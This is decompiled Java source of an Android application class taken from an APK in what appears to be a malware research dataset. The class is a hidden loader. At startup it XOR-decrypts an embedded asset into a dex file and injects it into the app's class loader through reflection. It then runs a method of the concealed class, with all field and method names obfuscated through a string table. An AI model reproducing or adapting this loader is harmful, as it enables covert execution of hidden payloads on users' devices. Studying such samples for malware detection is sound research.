package edu.raj.sphincter;

import android.app.Application;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import dalvik.system.DexFile;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.ListIterator;
import java.util.Set;
import java.util.zip.ZipFile;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/3e173b7be62214f799eb0828cfb13869.apk/classes.dex */
public class HandstandApplication extends Application {
    private static final String a = Priapic.a[11];
    private static final String b = Priapic.a[9];
    private static final String c = Priapic.a[5];
    private static final String d = Priapic.a[15];
    private static final Set e = new HashSet();

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    private static Field a(Object obj, String str) {
        for (Class<?> cls = obj.getClass(); cls != null; cls = cls.getSuperclass()) {
            try {
                Field declaredField = cls.getDeclaredField(str);
                if (!declaredField.isAccessible()) {
                    declaredField.setAccessible(true);
                }
                return declaredField;
            } catch (NoSuchFieldException e2) {
            }
        }
        throw new Exception();
    }

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    private static Method a(Object obj, String str, Class... clsArr) {
        for (Class<?> cls = obj.getClass(); cls != null; cls = cls.getSuperclass()) {
            try {
                Method declaredMethod = cls.getDeclaredMethod(str, clsArr);
                if (!declaredMethod.isAccessible()) {
                    declaredMethod.setAccessible(true);
                }
                return declaredMethod;
            } catch (NoSuchMethodException e2) {
            }
        }
        throw new Exception();
    }

    /* JADX WARN: Unreachable blocks removed: 4, instructions: 4 */
    public static void a(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            String packageName = context.getPackageName();
            File dir = context.getDir(Priapic.a[3], 0);
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 128);
            if (applicationInfo == null) {
                return;
            }
            synchronized (e) {
                String str = applicationInfo.sourceDir;
                if (e.contains(str)) {
                    return;
                }
                e.add(str);
                File file = new File(applicationInfo.dataDir, b);
                file.mkdirs();
                ClassLoader classLoader = context.getClassLoader();
                File file2 = new File(dir, d);
                if (!file2.exists()) {
                    a(context, file2);
                }
                a(classLoader, file, Arrays.asList(file2));
            }
        } catch (Exception e2) {
            throw new RuntimeException();
        }
    }

    /* JADX WARN: Unreachable blocks removed: 2, instructions: 2 */
    private static void a(ClassLoader classLoader, File file, List list) {
        if (list.isEmpty()) {
            return;
        }
        if (Build.VERSION.SDK_INT >= 19) {
            a(classLoader, list, file);
        } else if (Build.VERSION.SDK_INT >= 14) {
            b(classLoader, list, file);
        } else {
            a(classLoader, list);
        }
    }

    /* JADX WARN: Unreachable blocks removed: 6, instructions: 6 */
    private static void a(ClassLoader classLoader, List list) {
        int size = list.size();
        Field a2 = a(classLoader, Priapic.a[0]);
        StringBuilder sb = new StringBuilder((String) a2.get(classLoader));
        String[] strArr = new String[size];
        File[] fileArr = new File[size];
        ZipFile[] zipFileArr = new ZipFile[size];
        DexFile[] dexFileArr = new DexFile[size];
        ListIterator listIterator = list.listIterator();
        while (listIterator.hasNext()) {
            File file = (File) listIterator.next();
            String absolutePath = file.getAbsolutePath();
            sb.append(':').append(absolutePath);
            int previousIndex = listIterator.previousIndex();
            strArr[previousIndex] = absolutePath;
            fileArr[previousIndex] = file;
            zipFileArr[previousIndex] = new ZipFile(file);
            dexFileArr[previousIndex] = DexFile.loadDex(absolutePath, absolutePath + Priapic.a[6], 0);
        }
        a2.set(classLoader, sb.toString());
        a(classLoader, Priapic.a[7], dexFileArr);
        a(classLoader, Priapic.a[14], strArr);
        a(classLoader, Priapic.a[12], zipFileArr);
        a(classLoader, Priapic.a[2], fileArr);
    }

    /* JADX WARN: Unreachable blocks removed: 4, instructions: 4 */
    private static void a(ClassLoader classLoader, List list, File file) {
        IOException[] iOExceptionArr;
        Object obj = a(classLoader, Priapic.a[10]).get(classLoader);
        ArrayList arrayList = new ArrayList();
        a(obj, Priapic.a[1], a(obj, new ArrayList(list), file, arrayList));
        if (arrayList.size() > 0) {
            Field a2 = a(classLoader, Priapic.a[13]);
            IOException[] iOExceptionArr2 = (IOException[]) a2.get(classLoader);
            if (iOExceptionArr2 == null) {
                iOExceptionArr = (IOException[]) arrayList.toArray(new IOException[arrayList.size()]);
            } else {
                IOException[] iOExceptionArr3 = new IOException[arrayList.size() + iOExceptionArr2.length];
                arrayList.toArray(iOExceptionArr3);
                System.arraycopy(iOExceptionArr2, 0, iOExceptionArr3, arrayList.size(), iOExceptionArr2.length);
                iOExceptionArr = iOExceptionArr3;
            }
            a2.set(classLoader, iOExceptionArr);
        }
    }

    private static void a(Object obj, String str, Object[] objArr) {
        Field a2 = a(obj, str);
        Object[] objArr2 = (Object[]) a2.get(obj);
        Object[] objArr3 = (Object[]) Array.newInstance(objArr2.getClass().getComponentType(), objArr2.length + objArr.length);
        System.arraycopy(objArr2, 0, objArr3, 0, objArr2.length);
        System.arraycopy(objArr, 0, objArr3, objArr2.length, objArr.length);
        a2.set(obj, objArr3);
    }

    /* JADX WARN: Unreachable blocks removed: 3, instructions: 3 */
    private static boolean a(Context context, File file) {
        BufferedInputStream bufferedInputStream;
        BufferedOutputStream bufferedOutputStream;
        FileOutputStream fileOutputStream;
        BufferedOutputStream bufferedOutputStream2 = null;
        bufferedOutputStream2 = null;
        BufferedInputStream bufferedInputStream2 = null;
        boolean z = false;
        try {
            fileOutputStream = new FileOutputStream(file);
            bufferedInputStream = new BufferedInputStream(context.getAssets().open(c), 65536);
            try {
                bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 65536);
            } catch (Exception e2) {
                bufferedOutputStream = null;
                bufferedInputStream2 = bufferedInputStream;
            } catch (Throwable th) {
                th = th;
            }
        } catch (Exception e3) {
            bufferedOutputStream = null;
        } catch (Throwable th2) {
            th = th2;
            bufferedInputStream = null;
        }
        try {
            byte[] bArr = new byte[bufferedInputStream.available()];
            bufferedInputStream.read(bArr);
            for (int i = 0; i < bArr.length; i++) {
                bArr[i] = (byte) (bArr[i] ^ 50);
            }
            bufferedOutputStream.write(bArr);
            fileOutputStream.flush();
            z = true;
            if (bufferedOutputStream != null) {
                try {
                    bufferedOutputStream.close();
                } catch (Exception e4) {
                }
            }
            if (bufferedInputStream != null) {
                try {
                    bufferedInputStream.close();
                } catch (Exception e5) {
                }
            }
        } catch (Exception e6) {
            bufferedInputStream2 = bufferedInputStream;
            if (bufferedOutputStream != null) {
                try {
                    bufferedOutputStream.close();
                } catch (Exception e7) {
                }
            }
            if (bufferedInputStream2 != null) {
                try {
                    bufferedInputStream2.close();
                } catch (Exception e8) {
                }
            }
            return z;
        } catch (Throwable th3) {
            th = th3;
            bufferedOutputStream2 = bufferedOutputStream;
            if (bufferedOutputStream2 != null) {
                try {
                    bufferedOutputStream2.close();
                } catch (Exception e9) {
                }
            }
            if (bufferedInputStream == null) {
                throw th;
            }
            try {
                bufferedInputStream.close();
                throw th;
            } catch (Exception e10) {
                throw th;
            }
        }
        return z;
    }

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    private static Object[] a(Object obj, ArrayList arrayList, File file) {
        return (Object[]) a(obj, Priapic.a[8], ArrayList.class, File.class).invoke(obj, arrayList, file);
    }

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    private static Object[] a(Object obj, ArrayList arrayList, File file, ArrayList arrayList2) {
        return (Object[]) a(obj, Priapic.a[8], ArrayList.class, File.class, ArrayList.class).invoke(obj, arrayList, file, arrayList2);
    }

    /* JADX WARN: Unreachable blocks removed: 2, instructions: 2 */
    private static void b(ClassLoader classLoader, List list, File file) {
        Object obj = a(classLoader, Priapic.a[10]).get(classLoader);
        a(obj, Priapic.a[1], a(obj, new ArrayList(list), file));
    }

    @Override // android.content.ContextWrapper
    protected void attachBaseContext(Context context) {
        super.attachBaseContext(context);
        a(this);
    }

    /* JADX WARN: Unreachable blocks removed: 2, instructions: 2 */
    @Override // android.app.Application
    public void onCreate() {
        super.onCreate();
        try {
            String name = getClass().getName();
            int lastIndexOf = name.lastIndexOf(46);
            if (lastIndexOf != -1) {
                name = name.substring(0, lastIndexOf) + Priapic.a[4];
            }
            for (Method method : Class.forName(name).getDeclaredMethods()) {
                if (method.getReturnType() == Float.TYPE) {
                    method.invoke(null, this);
                    return;
                }
            }
        } catch (Exception e2) {
        }
    }
}
